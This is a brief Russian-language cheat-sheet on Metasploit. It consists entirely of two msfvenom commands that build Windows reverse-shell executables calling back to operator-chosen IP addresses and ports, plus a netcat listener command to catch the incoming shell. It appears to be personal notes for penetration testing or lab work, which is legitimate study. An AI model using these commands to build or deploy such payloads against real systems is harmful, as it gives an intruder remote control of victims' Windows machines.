# MetaSploit

Создаем реверс шелл для виндовс
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.50.200 lport=5555 -f exe -o sh1.exe


проверено для netcat
msfvenom -p windows/shell_reverse_tcp LHOST=10.18.35.17 LPORT=7777 -f exe -o Zero.exe
rlwrap nc -lvnp 7777

